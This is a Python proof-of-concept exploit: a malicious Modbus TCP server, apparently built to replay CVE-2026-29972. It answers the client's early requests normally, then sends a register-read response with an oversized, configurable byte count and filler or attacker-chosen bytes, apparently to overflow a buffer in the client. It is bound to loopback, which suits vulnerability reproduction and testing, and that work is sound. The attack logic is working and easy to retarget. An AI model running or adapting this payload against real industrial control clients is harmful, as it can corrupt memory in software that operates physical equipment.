#!/usr/bin/env python3
"""Loopback-only malicious Modbus TCP server for CVE-2026-29972 replay.

Answers the upstream example client's first four requests normally (FC15,
FC1, FC16), then answers FC3 with a response whose byte_count is chosen by
NMBS_COUNT (default 250) and whose register bytes are all NMBS_BYTE.
Only 127.0.0.1 is bound; no external address is contacted.
"""

import os
import socket
import struct
import sys

HOST = "127.0.0.1"
PORT = int(os.environ.get("NMBS_PORT", "15022"))
COUNT = int(os.environ.get("NMBS_COUNT", "250"))
BYTE = int(os.environ.get("NMBS_BYTE", "0x41"), 0)
MEM_HEX = os.environ.get("NMBS_MEM_HEX", "")


def exact(conn, n):
    out = b""
    while len(out) < n:
        part = conn.recv(n - len(out))
        if not part:
            return None
        out += part
    return out


def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORT))
    srv.listen(1)
    srv.settimeout(10)
    print("SERVER_READY", flush=True)
    conn, _ = srv.accept()
    conn.settimeout(10)
    try:
        while True:
            hdr = exact(conn, 8)
            if hdr is None:
                break
            txid, proto, length, unit, fc_h = struct.unpack(">HHHBB", hdr)
            if proto != 0 or not (2 <= length <= 255):
                print("SERVER_BAD_MBAP", flush=True)
                break
            pdu = exact(conn, length - 2)
            if pdu is None:
                break
            fc = fc_h
            print("SERVER_REQ fc=%d length=%d pdu=%s" % (fc, length, pdu.hex()), flush=True)
            if fc in (15, 16):
                resp = bytes([fc]) + pdu[:4]  # echo address and quantity
            elif fc == 1:
                resp = bytes([1, 1, 0])  # 3 coils -> 1 byte
            elif fc == 3:
                mem = bytes.fromhex(MEM_HEX) if MEM_HEX else bytes([BYTE]) * COUNT
                mem = mem + bytes([BYTE]) * (COUNT - len(mem))
                wire = bytes(b for pair in zip(mem[0::2], mem[1::2]) for b in (pair[1], pair[0]))
                resp = bytes([3, COUNT & 0xFF]) + wire
                print(
                    "SERVER_ATTACK_SENT fc=3 byte_count=%d byte=0x%02x" % (COUNT, BYTE),
                    flush=True,
                )
                if MEM_HEX:
                    print("SERVER_MEM_SET len=%d" % len(mem), flush=True)
            else:
                resp = bytes([fc | 0x80, 1])  # illegal function
            body = bytes([unit]) + resp
            conn.sendall(struct.pack(">HHH", txid, 0, len(body)) + body)
            if fc == 3:
                break
    finally:
        conn.close()
        srv.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
